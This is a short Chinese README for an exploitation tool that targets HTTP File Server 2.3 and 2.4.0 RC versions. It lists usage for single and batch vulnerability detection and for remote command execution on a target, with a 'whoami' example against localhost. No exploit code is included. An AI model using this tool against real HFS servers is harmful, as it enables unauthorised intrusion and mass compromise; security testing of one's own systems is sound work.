# HFS-EXP-TOOL

HTTP File Server 综合利用工具，目标版本：
- 	HFS 2.3 beta
- 	HFS 2.3d
-   HFS 2.3m
-   HFS 2.3k
-   HFS 2.4.0 RC6
-   HFS 2.4.0 RC7

使用方法： 
- hfs-exp-tool.exe --detect-url <protocol:host:port>
- hfs-exp-tool.exe --detect-file <filename>
- hfs-exp-tool.exe --exp <protocol:host:port> <command> [arguments...]

示例：

批量检测

```
.\hfs-exp-tool.exe --detect-file .\url.txt
```

单独检测

```
.\hfs-exp-tool.exe --detect-url http://127.0.0.1:8003
```

命令执行

```
.\hfs-exp-tool.exe --exp http://127.0.0.1:8003 "whoami"
```
